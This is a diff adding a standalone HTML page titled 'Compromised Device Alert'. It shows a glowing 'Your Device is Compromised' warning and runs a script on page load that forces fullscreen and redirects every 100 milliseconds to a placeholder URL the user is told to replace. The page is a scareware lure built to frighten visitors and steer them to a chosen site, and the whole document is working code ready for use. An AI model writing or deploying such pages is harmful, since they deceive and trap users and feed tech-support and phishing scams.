@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Compromised Device Alert</title>
+    <style>
+        /* Basic Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body, html {
+            height: 100%;
+            width: 100%;
+        }
+
+        /* Background setup */
+        body {
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            color: orange;
+        }
+
+        /* Glowing Text */
+        .glowing-text {
+            font-size: 3rem;
+            font-weight: bold;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 0.2em;
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+
+        /* Glowing effect animation */
+        @keyframes glow {
+            0% {
+                text-shadow: 0 0 10px orange, 0 0 20px orange, 0 0 30px orange, 0 0 40px orange, 0 0 50px orange;
+            }
+            100% {
+                text-shadow: 0 0 20px orange, 0 0 30px orange, 0 0 40px orange, 0 0 50px orange, 0 0 60px orange;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="glowing-text">
+        Your Device is Compromised
+    </div>
+
+    <script>
+        const targetUrl = "https://example.com";  // Replace with your desired URL
+
+        // Function to request fullscreen mode
+        function goFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+
+        // Function to continuously open the target URL
+        function openLink() {
+            window.location.href = targetUrl;  // Redirect to the target URL
+        }
+
+        // Function to handle the looping process
+        function loop() {
+            goFullscreen();  // Ensure fullscreen is requested
+            openLink();  // Open the target URL
+            setTimeout(loop, 100);  // Re-run every 100 milliseconds to ensure continuous fullscreen and navigation
+        }
+
+        // Start the loop as soon as the page loads
+        window.onload = loop;
+    </script>
+</body>
+</html>
